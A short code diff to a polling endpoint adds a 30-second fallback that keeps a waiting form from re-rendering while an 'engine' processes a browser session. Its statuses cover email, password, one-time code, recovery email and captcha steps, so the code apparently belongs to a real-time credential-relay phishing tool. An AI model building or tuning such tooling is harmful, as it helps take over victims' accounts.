@@ -96,7 +96,23 @@ export async function POST(request) {
         );
     }
 
-    const engineProcessing = activelyProcessing.has(browserId);
+    let engineProcessing = activelyProcessing.has(browserId);
+    if (!engineProcessing) {
+        // Fallback: if user just submitted data (lastUserActivity < 30s ago) and status
+        // is still a waiting state, return engineProcessing=true. This bridges the gap
+        // between update-process writing to cache and the engine calling
+        // activelyProcessing.add(browserId). Without this, the template re-renders
+        // the waiting form and wipes the user's typed input.
+        const waitingStatuses = new Set(["WAITING","WAITINGEMAIL","WAITINGEMAILERROR","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGCAPTCHA"]);
+        if (waitingStatuses.has(row.status)) {
+            const recentActivity = new Date(row.lastUserActivity || row.lastRun || row.timestamp);
+            const age = Date.now() - recentActivity.getTime();
+            if (age < 30000) {
+                engineProcessing = true;
+                logger.info(`[pooling][${browserId}] Recent user activity (${age}ms ago). engineProcessing=true to protect template from re-render.`);
+            }
+        }
+    }
     logger.info(`[pooling][${browserId}] Returning status: ${row.status} | engineProcessing: ${engineProcessing}`);
     return corsJson({
         success: true,
